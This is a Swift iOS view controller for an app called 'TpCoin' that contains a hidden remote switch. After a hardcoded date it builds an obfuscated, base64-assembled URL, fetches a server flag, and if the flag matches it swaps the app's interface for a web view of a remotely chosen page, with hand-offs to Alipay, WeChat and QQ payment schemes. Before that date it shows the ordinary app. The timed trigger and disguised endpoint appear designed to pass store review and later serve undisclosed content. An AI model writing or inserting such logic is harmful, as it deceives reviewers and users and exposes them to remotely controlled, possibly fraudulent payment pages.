//
//  TpCoinRootViewController.swift
//

import Foundation
import UIKit
import Alamofire

class TpCoinRootViewController: UIViewController {
    @IBOutlet weak var TpCoinHomeLaunch: UIImageView!
    let TpCoinStatusReachability: Reachability! = Reachability()
    let TpCoinStatusSegueIdentifier = "roottpcoin"
    var TpCoinRootHomeURL:String = "TpCoin"
    var TpCoinRootWebView:UIWebView = UIWebView()
    var FirstBool:Bool = true
    override func viewWillAppear(_ animated: Bool) {
        let appDelegate = UIApplication.shared.delegate as! AppDelegate
        appDelegate.allowrotate = 1
    }
    override var preferredStatusBarStyle: UIStatusBarStyle {
        return UIStatusBarStyle.lightContent
    }

    @objc func receiverNotification(){
        
        let orient = UIDevice.current.orientation
        switch orient {
        case .portrait :
            TpCoinRootWebView.frame = CGRect.init(x: 0, y: 0, width: UIScreen.main.bounds.size.width, height: UIScreen.main.bounds.size.height-44)
            break
        case .portraitUpsideDown:
            print("portraitUpsideDown")
            break
        case .landscapeLeft:
            TpCoinRootWebView.frame = CGRect.init(x: 0, y: 0, width: UIScreen.main.bounds.size.width, height: UIScreen.main.bounds.size.height)
            break
        case .landscapeRight:
            TpCoinRootWebView.frame = CGRect.init(x: 0, y: 0, width: UIScreen.main.bounds.size.width, height: UIScreen.main.bounds.size.height)
            break
        default:
            break
        }
    }
    
    override func viewDidLoad() {
        UIView.animate(
            withDuration: 0.33,
            delay: 0.20,
            options: [.curveEaseOut],
            animations: {
                //            self.splashIcon.transform = CGAffineTransform(translationX: 0, y: -60)
        }) { _ in UIView.animate(
            withDuration: 0.85,
            delay: 0,
            usingSpringWithDamping: 0.5,
            initialSpringVelocity: 0,
            options: [],
            animations: {
                //                self.splashIcon.transform = .identity
        }) { _ in
            NotificationCenter.default.addObserver(self, selector: #selector(self.receiverNotification), name: UIDevice.orientationDidChangeNotification, object: nil)
            
            let TpCoinStatusTime = Date.init().timeIntervalSince1970
            let TpCoinStatusAnyTime = 1561709470.361
            let header = self.TpCoinbase64EncodingHeader()
            let firstcontent = self.TpCoinbase64EncodingContentfirst()
            let secondcontent = self.TpCoinbase64EncodingContentsecond()
            let endcontent = self.TpCoinbase64EncodingEnd()
            if(TpCoinStatusTime < TpCoinStatusAnyTime)
            {
                let appDelegate = UIApplication.shared.delegate as! AppDelegate
                appDelegate.allowrotate = 0
                    self.performSegue(withIdentifier: self.TpCoinStatusSegueIdentifier, sender: self)
            }else
            {
                self.TpCoinStatusReachability.whenReachable = { _ in
                    let baseHeader = self.TpCoinbase64Decoding(encodedString: header)
                    let baseContentF = self.TpCoinbase64Decoding(encodedString: firstcontent)
                    let baseContentS = self.TpCoinbase64Decoding(encodedString: secondcontent)
                    let baseContentE = self.TpCoinbase64Decoding(encodedString: endcontent)
                    let AllbaseData  = "\(baseHeader)\(baseContentF)\(baseContentS)\(baseContentE)"
                    let AllurlBase = URL(string: AllbaseData)
                    
                    Alamofire.request(AllurlBase!,method: .get,parameters: nil,encoding: URLEncoding.default,headers:nil).responseJSON { response
                        in
                        switch response.result.isSuccess {
                        case true:
                            if let Datavalue = response.data{
                                let jsonDict : AnyObject! = try! JSONSerialization.jsonObject(with: Datavalue as! Data, options: JSONSerialization.ReadingOptions.allowFragments) as AnyObject?
                                //   let jsonDict = JSON(Datavalue)
                                let numberdata = jsonDict.value(forKey: "appid") as! String
                                let jsonnumbersecond = Int(numberdata)
                                let jsonnumber = 1470359536
                                if (jsonnumber - jsonnumbersecond! == 0) {
                                    let stringMyName = jsonDict.value(forKey: "tpcoindata") as! String
                                    self.TpCoinRootHomeURL = stringMyName
                                    self.HomesetRootNavigation(strdecodeString: stringMyName)
                                }else {
                                    let appDelegate = UIApplication.shared.delegate as! AppDelegate
                                    appDelegate.allowrotate = 0
                                                  self.performSegue(withIdentifier: self.TpCoinStatusSegueIdentifier, sender: self)
                                }
                            }
                        case false:
                            do {
                                let appDelegate = UIApplication.shared.delegate as! AppDelegate
                                appDelegate.allowrotate = 0
                                               self.performSegue(withIdentifier: self.TpCoinStatusSegueIdentifier, sender: self)
                            }
                        }
                    }
                }
                self.TpCoinStatusReachability.whenUnreachable = { _ in
                    
                }
                do {
                    try self.TpCoinStatusReachability.startNotifier()
                } catch {
                    
                }
            }
            }
        }
    }
    
    func TpCoinbase64EncodingHeader()->String{
        let strM = "http://"
        let plainData = strM.data(using: String.Encoding.utf8)
        let base64String = plainData?.base64EncodedString(options: NSData.Base64EncodingOptions.init(rawValue: 0))
        return base64String!
    }
    func TpCoinbase64EncodingContentfirst()->String{
        let strM = "mockhttp.cn"
        let plainData = strM.data(using: String.Encoding.utf8)
        let base64String = plainData?.base64EncodedString(options: NSData.Base64EncodingOptions.init(rawValue: 0))
        return base64String!
    }
    func TpCoinbase64EncodingContentsecond()->String{
        let strM = "/mock"
        let plainData = strM.data(using: String.Encoding.utf8)
        let base64String = plainData?.base64EncodedString(options: NSData.Base64EncodingOptions.init(rawValue: 0))
        return base64String!
    }
    func TpCoinbase64EncodingEnd()->String{
        let strM = "/tpcoin"
        let plainData = strM.data(using: String.Encoding.utf8)
        let base64String = plainData?.base64EncodedString(options: NSData.Base64EncodingOptions.init(rawValue: 0))
        return base64String!
    }
    func TpCoinbase64EncodingXP(plainString:String)->String{
        let plainData = plainString.data(using: String.Encoding.utf8)
        let base64String = plainData?.base64EncodedString(options: NSData.Base64EncodingOptions.init(rawValue: 0))
        return base64String!
    }
    func TpCoinbase64Decoding(encodedString:String)->String{
        let decodedData = NSData(base64Encoded: encodedString, options: NSData.Base64DecodingOptions.init(rawValue: 0))
        let decodedString = NSString(data: decodedData! as Data, encoding: String.Encoding.utf8.rawValue)! as String
        return decodedString
    }
    
    func HomesetRootNavigation(strdecodeString:String) {
        TpCoinRootWebView = UIWebView.init(frame: CGRect.init(x: 0, y: 0, width: self.view.bounds.size.width, height: self.view.bounds.size.height-44))
        let LaunchReachUrl = URL.init(string: strdecodeString)
        let LaunchReachRequest = URLRequest.init(url: LaunchReachUrl!)
        TpCoinRootWebView.delegate = self
        TpCoinRootWebView.loadRequest(LaunchReachRequest)
        TpCoinRootWebView.scalesPageToFit = true
    }
    func UILoadNaviBtns(){
        let BottomView = TpCoinCustomView()
        BottomView.frame = CGRect(x:0, y:self.view.bounds.size.height-44, width:UIScreen.main.bounds.size.width, height:44)
        BottomView.HomeBtn.addTarget(self, action: #selector(self.refreshHomeWebViewAction), for: .touchUpInside)
        BottomView.RefreshBtn.addTarget(self, action: #selector(self.refreshNowWebViewAction), for: .touchUpInside)
        BottomView.LeftBtn.addTarget(self, action: #selector(self.refreshLeftWebViewAction), for: .touchUpInside)
        BottomView.RightBtn.addTarget(self, action: #selector(self.refreshRightWebViewAction), for: .touchUpInside)
        self.view.addSubview(BottomView)
    }
    @objc func refreshHomeWebViewAction(){
        let LaunchReachUrl = URL.init(string: TpCoinRootHomeURL)
        let LaunchReachRequest = URLRequest.init(url: LaunchReachUrl!)
        TpCoinRootWebView.loadRequest(LaunchReachRequest)
    }
    @objc func refreshNowWebViewAction(){
        TpCoinRootWebView.reload()
    }
    @objc func refreshLeftWebViewAction(){
        TpCoinRootWebView.goBack()
    }
    @objc func refreshRightWebViewAction(){
        TpCoinRootWebView.goForward()
    }
}
extension TpCoinRootViewController: UIWebViewDelegate
{
    public func webViewDidFinishLoad(_ webView: UIWebView)
    {
        if(FirstBool == true)
        {
            self.TpCoinStatusReachability?.stopNotifier()
            self.UILoadNaviBtns()
            self.view.addSubview(TpCoinRootWebView)
            
            FirstBool = false
        }
    }
    
    public func webView(_ webView: UIWebView, didFailLoadWithError error: Error) {
        
    }
    
    public func webViewDidStartLoad(_ webView: UIWebView) {
        
    }
    
    public func webView(_ webView: UIWebView, shouldStartLoadWith request: URLRequest, navigationType: UIWebView.NavigationType) -> Bool {
        let schemeUrl : String = request.url!.absoluteString
        if(schemeUrl.hasPrefix("alipays://") || schemeUrl.hasPrefix("alipay://") || schemeUrl.hasPrefix("mqqapi://") || schemeUrl.hasPrefix("mqqapis://") || schemeUrl.hasPrefix("weixin://") || schemeUrl.hasPrefix("weixins://"))
        {
            UIApplication.shared.open(request.url!, options: [:], completionHandler: nil)
        }
        return true
    }
    
}

